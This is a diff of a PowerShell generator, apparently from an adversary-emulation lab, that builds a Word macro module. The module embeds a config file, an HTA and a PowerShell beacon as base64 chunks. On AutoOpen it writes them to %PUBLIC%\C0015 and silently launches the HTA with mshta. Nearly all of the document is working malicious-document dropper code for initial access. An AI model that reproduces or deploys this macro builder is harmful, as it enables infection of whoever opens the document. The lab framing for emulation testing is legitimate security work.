@@ -1,29 +1,28 @@
 <#
 .SYNOPSIS
 Generate the self-contained VBA module (stage/ws01/macro_embedded.vba) that embeds
-config.ini + bootstrap.hta + c0015_beacon.ps1 as base64 blobs, so the Word macro
-WRITES them to %PUBLIC%\C0015\ at open time (docs/rerun-v2-remote-operator-design.md
-§3.1). Result: before the victim opens test.docm the WS01 disk holds NO lab tooling
-- config/HTA/beacon are created by the macro (camp-realistic initial access), and
-any DLL still arrives over HTTP T1105 at runtime.
+config.ini + bootstrap.hta + c0015_beacon.ps1 as base64 chunks, so the Word macro
+WRITES them to %PUBLIC%\C0015\ at open time (docs/rerun-v2-remote-operator-design.md §3.1).
 
-Output module = canonical payloads/docm/macro_payload.vba + WriteFiles() + consts.
+REWRITTEN 2026-10-02 (goal #3): the module is built from scratch as ONE clean
+standard-module body - no template splicing - so no trailing-junk / End-Sub
+boundary hazards. Trigger = `Public Sub AutoOpen()` ONLY (standard module;
+Document_Open is skipped because the ThisDocument object module collides with
+inherited Document members).
+
 Use with: install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba
+(the installer injects into a STANDARD MODULE 'c0015Payload' by default).
 
 .PARAMETER Config    Per-run config.ini (payloads/packaging/make_config.ps1 output).
 .PARAMETER Hta       payloads/hta/bootstrap.hta
 .PARAMETER Beacon    payloads/beacon/c0015_beacon.ps1
-.PARAMETER Template  Canonical macro (payloads/docm/macro_payload.vba).
 .PARAMETER OutPath   Generated module (default stage/ws01/macro_embedded.vba).
-.EXAMPLE
-pwsh -File payloads/packaging/gen_macro_embedded.ps1 -Config stage/ws01/config.ini
 #>
 [CmdletBinding()]
 param(
     [string]$Config = 'stage/ws01/config.ini',
     [string]$Hta = 'payloads/hta/bootstrap.hta',
     [string]$Beacon = 'payloads/beacon/c0015_beacon.ps1',
-    [string]$Template = 'payloads/docm/macro_payload.vba',
     [string]$OutPath = 'stage/ws01/macro_embedded.vba'
 )
 $ErrorActionPreference = 'Stop'
@@ -31,10 +30,7 @@ $repo = (Get-Item (Join-Path $PSScriptRoot '..\..')).FullName
 
 function Load-B64 {
     param([string]$Rel)
-    # accept relative (repo-rooted) or absolute input; Join-Path doubles the root
-    # when the child is already rooted, so resolve explicitly.
-    $p = if ([System.IO.Path]::IsPathRooted($Rel)) { $Rel }
-         else { Join-Path $repo $Rel }
+    $p = if ([System.IO.Path]::IsPathRooted($Rel)) { $Rel } else { Join-Path $repo $Rel }
     if (-not (Test-Path -LiteralPath $p)) { throw "missing input: $Rel" }
     return [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($p))
 }
@@ -42,100 +38,148 @@ function Load-B64 {
 $cfgB64 = Load-B64 $Config
 $htaB64 = Load-B64 $Hta
 $bcnB64 = Load-B64 $Beacon
-$tpl = Get-Content -LiteralPath (Join-Path $repo $Template) -Raw
 
-# ---- chunk each blob into < 900-char const lines (VBA line limit 1023) ----
 function New-Chunks {
     param([string]$B64, [string]$Prefix)
     $out = New-Object System.Collections.Generic.List[string]
-    for ($i = 0; $i -lt $B64.Length; $i += 900) {
-        $len = [Math]::Min(900, $B64.Length - $i)
+    for ($i = 0; $i -lt $B64.Length; $i += 780) {
+        $len = [Math]::Min(780, $B64.Length - $i)
         $out.Add("Private Const ${Prefix}_$($out.Count) = `"$($B64.Substring($i, $len))`"")
     }
     return , $out.ToArray()
 }
-function New-Joined {
-    param([string]$Prefix, [int]$Count)
-    $parts = @()
-    for ($i = 0; $i -lt $Count; $i++) { $parts += "${Prefix}_$i" }
-    return ("Private Const {0} = {1}" -f $Prefix, ($parts -join ' & '))
+$cCfg = New-Chunks $cfgB64 'CFG'
+$cHta = New-Chunks $htaB64 'HTA'
+$cBcn = New-Chunks $bcnB64 'BCN'
+
+function JoinRefs { param([string]$Prefix, [int]$Count)
+    $parts = @(); for ($i = 0; $i -lt $Count; $i++) { $parts += "${Prefix}_$i" }
+    return ($parts -join ' & ')
 }
-$cCfg = New-Chunks $cfgB64 'CFG_B64'
-$cHta = New-Chunks $htaB64 'HTA_B64'
-$cBcn = New-Chunks $bcnB64 'BCN_B64'
-$all = New-Object System.Collections.Generic.List[string]
-$all.Add("' -------- embedded blobs (generated) --------")
-$all.AddRange($cCfg); $all.AddRange($cHta); $all.AddRange($cBcn)
-$all.Add((New-Joined 'CFG_B64' $cCfg.Count))
-$all.Add((New-Joined 'HTA_B64' $cHta.Count))
-$all.Add((New-Joined 'BCN_B64' $cBcn.Count))
-$all.Add('')
-$all.Add("' -------- write stage files at open (S1 delivery, T1204.002) --------")
-$all.Add(@'
-' native-I/O writer (NO COM objects: no FSO/MSXML/ADODB) - WriteFiles path is
-' build-in VBA only (Open/Put/MkDir) so a COM failure cannot stop it.
-Private Function DecodeB64(ByVal s As String) As Byte()
-    Dim tbl As String, i As Long, n As Long, j As Long, acc As Long, bits As Long
-    Dim c As String, v As Long, out() As Byte
-    tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-    n = 0
-    For i = 1 To Len(s)
-        If Mid$(s, i, 1) <> "=" Then n = n + 1
-    Next i
-    ReDim out(0 To (n * 3) \ 4 - 1)
-    i = 1: j = 0: acc = 0: bits = 0
-    Do While i <= Len(s)
-        c = Mid$(s, i, 1)
-        If c <> "=" Then
-            v = InStr(1, tbl, c) - 1
-            acc = acc * 64 + v
-            bits = bits + 6
-            If bits >= 8 Then
-                bits = bits - 8
-                out(j) = (acc \ (2 ^ bits)) Mod 256
-                j = j + 1
-                acc = acc Mod (2 ^ bits)
-            End If
-        End If
-        i = i + 1
-    Loop
-    DecodeB64 = out
-End Function
 
-Private Sub WriteFileNative(ByVal p As String, data() As Byte)
-    On Error Resume Next
-    Dim ff As Integer
-    ff = FreeFile
-    Open p For Binary Access Write As #ff
-    If UBound(data) >= 0 Then Put #ff, , data
-    Close #ff
-End Sub
-
-Private Sub WriteFiles()
-    On Error Resume Next
-    Dim d As String
-    d = Environ("PUBLIC") & "\C0015"
-    MkDir d
-    Dim arr(2) As String, i As Integer
-    arr(0) = "config.ini": arr(1) = "bootstrap.hta": arr(2) = "c0015_beacon.ps1"
-    For i = 0 To 2
-        Dim payload() As Byte
-        If i = 0 Then payload = DecodeB64(CFG_B64)
-        If i = 1 Then payload = DecodeB64(HTA_B64)
-        If i = 2 Then payload = DecodeB64(BCN_B64)
-        Call WriteFileNative(d & "\" & arr(i), payload)
-    Next i
-End Sub
-'@)
-# ---- inject WriteFiles call at the top of RunEntry ----
-$tpl = $tpl -replace '(?m)^Private Sub RunEntry\(\)\s*$', "Private Sub RunEntry()`r`n    WriteFiles   ' v2: no pre-staged files - macro creates config/hta/beacon"
-$tpl = $tpl.TrimEnd() + "`r`n`r`n" + ($all -join "`r`n") + "`r`n"
+$L = New-Object System.Collections.Generic.List[string]
+$L.Add("' c0015 payload macro [LAB-SURROGATE] - generated by gen_macro_embedded.ps1")
+$L.Add("' Standard-module, native-I/O writer (no COM objects); AutoOpen-triggered.")
+$L.Add("Private m_started As Boolean")
+$L.Add('')
+$L.Add("' -------- embedded blobs (base64 chunks) --------")
+$cCfg | ForEach-Object { $L.Add($_) }
+$cHta | ForEach-Object { $L.Add($_) }
+$cBcn | ForEach-Object { $L.Add($_) }
+$L.Add('')
+$L.Add("Private Function BlobCfg() As String")
+$L.Add("    BlobCfg = $(JoinRefs 'CFG' $cCfg.Count)")
+$L.Add("End Function")
+$L.Add("Private Function BlobHta() As String")
+$L.Add("    BlobHta = $(JoinRefs 'HTA' $cHta.Count)")
+$L.Add("End Function")
+$L.Add("Private Function BlobBcn() As String")
+$L.Add("    BlobBcn = $(JoinRefs 'BCN' $cBcn.Count)")
+$L.Add("End Function")
+$L.Add('')
+$L.Add("Private Function DecodeB64(ByVal s As String) As Byte()")
+$L.Add("    Dim tbl As String, i As Long, n As Long, j As Long, acc As Long, bits As Long")
+$L.Add("    Dim c As String, v As Long, out() As Byte")
+$L.Add("    tbl = `"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/`"")
+$L.Add("    n = 0")
+$L.Add("    For i = 1 To Len(s)")
+$L.Add("        If Mid`$(s, i, 1) <> `"=`" Then n = n + 1")
+$L.Add("    Next i")
+$L.Add("    If n < 4 Then")
+$L.Add("        ReDim out(0 To 0)")
+$L.Add("        out(0) = 0")
+$L.Add("        DecodeB64 = out")
+$L.Add("        Exit Function")
+$L.Add("    End If")
+$L.Add("    ReDim out(0 To (n * 3) \ 4 - 1)")
+$L.Add("    i = 1: j = 0: acc = 0: bits = 0")
+$L.Add("    Do While i <= Len(s)")
+$L.Add("        c = Mid`$(s, i, 1)")
+$L.Add("        If c <> `"=`" Then")
+$L.Add("            v = InStr(1, tbl, c) - 1")
+$L.Add("            acc = acc * 64 + v")
+$L.Add("            bits = bits + 6")
+$L.Add("            If bits >= 8 Then")
+$L.Add("                bits = bits - 8")
+$L.Add("                out(j) = Int(acc / (2 ^ bits)) Mod 256")
+$L.Add("                j = j + 1")
+$L.Add("                acc = acc - Int(acc / (2 ^ bits)) * (2 ^ bits)")
+$L.Add("            End If")
+$L.Add("        End If")
+$L.Add("        i = i + 1")
+$L.Add("    Loop")
+$L.Add("    DecodeB64 = out")
+$L.Add("End Function")
+$L.Add('')
+$L.Add("Private Sub WriteLog(ByVal msg As String)")
+$L.Add("    On Error Resume Next")
+$L.Add("    Dim ff As Integer")
+$L.Add("    ff = FreeFile")
+$L.Add("    Open `"C:\Windows\Temp\c0015wf.log`" For Append As #ff")
+$L.Add("    Print #ff, Time & `" `" & msg")
+$L.Add("    Close #ff")
+$L.Add("End Sub")
+$L.Add('')
+$L.Add("Private Sub WriteFileNative(ByVal p As String, data() As Byte)")
+$L.Add("    On Error Resume Next")
+$L.Add("    Dim ff As Integer")
+$L.Add("    ff = FreeFile")
+$L.Add("    Open p For Binary Access Write As #ff")
+$L.Add("    If UBound(data) >= 0 Then Put #ff, , data")
+$L.Add("    Close #ff")
+$L.Add("End Sub")
+$L.Add('')
+$L.Add("Private Sub WriteFiles()")
+$L.Add("    On Error Resume Next")
+$L.Add("    WriteLog `"start user=`" & Environ(`"USERNAME`")")
+$L.Add("    Dim d As String")
+$L.Add("    d = Environ(`"PUBLIC`") & `"\C0015`"")
+$L.Add("    MkDir d")
+$L.Add("    Dim p0() As Byte, p1() As Byte, p2() As Byte")
+$L.Add("    p0 = DecodeB64(BlobCfg())")
+$L.Add("    p1 = DecodeB64(BlobHta())")
+$L.Add("    p2 = DecodeB64(BlobBcn())")
+$L.Add("    WriteLog `"decoded len0=`" & (UBound(p0) + 1) & `" len1=`" & (UBound(p1) + 1) & `" len2=`" & (UBound(p2) + 1)")
+$L.Add("    Call WriteFileNative(d & `"\config.ini`", p0)")
+$L.Add("    WriteLog `"wrote config.ini err=`" & Err.Number & `" `" & Err.Description")
+$L.Add("    Call WriteFileNative(d & `"\bootstrap.hta`", p1)")
+$L.Add("    WriteLog `"wrote bootstrap.hta err=`" & Err.Number & `" `" & Err.Description")
+$L.Add("    Call WriteFileNative(d & `"\c0015_beacon.ps1`", p2)")
+$L.Add("    WriteLog `"wrote beacon err=`" & Err.Number & `" `" & Err.Description")
+$L.Add("    WriteLog `"done`"")
+$L.Add("End Sub")
+$L.Add('')
+$L.Add("Public Sub AutoOpen()")
+$L.Add("    If m_started Then Exit Sub")
+$L.Add("    m_started = True")
+$L.Add("    On Error Resume Next")
+$L.Add("    Call WriteFiles")
+$L.Add("    Dim fso As Object")
+$L.Add("    Set fso = CreateObject(`"Scripting.FileSystemObject`")")
+$L.Add("    Dim iniPath As String")
+$L.Add("    iniPath = Environ(`"PUBLIC`") & `"\C0015\config.ini`"")
+$L.Add("    If Not fso.FileExists(iniPath) Then Exit Sub")
+$L.Add("    Dim ini As Object")
+$L.Add("    Set ini = fso.OpenTextFile(iniPath, 1)")
+$L.Add("    Dim ln As String, htaPath As String, mshtaPath As String")
+$L.Add("    htaPath = `"`": mshtaPath = `"`"")
+$L.Add("    Do Until ini.AtEndOfStream")
+$L.Add("        ln = ini.ReadLine")
+$L.Add("        If Left(ln, 9) = `"hta_path=`" Then htaPath = Mid(ln, 10)")
+$L.Add("        If Left(ln, 11) = `"mshta_path=`" Then mshtaPath = Mid(ln, 12)")
+$L.Add("    Loop")
+$L.Add("    ini.Close")
+$L.Add("    If htaPath = `"`" Then Exit Sub")
+$L.Add("    If mshtaPath = `"`" Then mshtaPath = `"C:\Windows\System32\mshta.exe`"")
+$L.Add("    Dim sh As Object")
+$L.Add("    Set sh = CreateObject(`"WScript.Shell`")")
+$L.Add("    sh.Run mshtaPath & `" `" & htaPath, 0, False")
+$L.Add("End Sub")
 
 $out = if ([System.IO.Path]::IsPathRooted($OutPath)) { $OutPath } else { Join-Path $repo $OutPath }
 New-Item -ItemType Directory -Force -Path (Split-Path $out -Parent) | Out-Null
-Set-Content -LiteralPath $out -Value $tpl -Encoding UTF8
-Write-Output "generated: $out"
-Write-Output "  embedded: config.ini ($($cfgB64.Length/1024 -as [int]) KB b64), bootstrap.hta ($($htaB64.Length/1024 -as [int]) KB), c0015_beacon.ps1 ($($bcnB64.Length/1024 -as [int]) KB)"
-$runEntryCount = ([regex]::Matches($tpl, '(?m)^\s*(Private|Public)?\s*Sub\s+RunEntry\b')).Count
-if ($runEntryCount -ne 1) { throw "generated module must define RunEntry exactly once (found $runEntryCount)" }
-Write-Output "  guard: RunEntry x1 OK; WS01 step: install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba"
+Set-Content -LiteralPath $out -Value ($L -join "`r`n") -Encoding UTF8
+Write-Output "generated: $out ($($L.Count) lines)"
+$runCount = ([regex]::Matches(($L -join "`r`n"), '(?m)^\s*Public Sub AutoOpen\b')).Count
+Write-Output "guard: AutoOpen x$runCount (can be 1); WS01: install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba"
+
